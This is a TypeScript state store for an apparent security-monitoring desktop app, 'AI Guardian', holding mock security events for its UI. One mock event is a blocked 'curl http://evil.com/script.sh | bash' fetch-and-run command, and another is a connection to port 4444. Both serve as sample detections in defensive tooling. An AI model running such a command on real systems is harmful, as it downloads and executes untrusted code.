/**
 * AI Guardian - Events Store
 *
 * 安全事件状态管理
 */

import { create } from 'zustand';

export interface SecurityEvent {
  id: string;
  timestamp: number;
  processId: number;
  processName: string;
  operation: string;
  target: string;
  riskScore: number;
  decision: 'allow' | 'block' | 'ask';
}

interface EventsStore {
  recentEvents: SecurityEvent[];
  addEvent: (event: SecurityEvent) => void;
  fetchEvents: () => Promise<void>;
}

// 模拟事件数据
const mockEvents: SecurityEvent[] = [
  {
    id: '1',
    timestamp: Date.now() - 1000,
    processId: 1234,
    processName: 'node',
    operation: 'File Delete',
    target: '/tmp/test.txt',
    riskScore: 25,
    decision: 'allow',
  },
  {
    id: '2',
    timestamp: Date.now() - 5000,
    processId: 5678,
    processName: 'python',
    operation: 'Network Connect',
    target: '192.168.1.100:4444',
    riskScore: 85,
    decision: 'block',
  },
  {
    id: '3',
    timestamp: Date.now() - 10000,
    processId: 9012,
    processName: 'bash',
    operation: 'Process Exec',
    target: 'curl http://evil.com/script.sh | bash',
    riskScore: 95,
    decision: 'block',
  },
];

export const useEventsStore = create<EventsStore>((set) => ({
  recentEvents: mockEvents,

  addEvent: (event) => {
    set((state) => ({
      recentEvents: [event, ...state.recentEvents].slice(0, 100),
    }));
  },

  fetchEvents: async () => {
    // 实际应该调用后端 API
    // const response = await window.electronAPI.sendCommand('get-events');
    // set({ recentEvents: response.data });
  },
}));
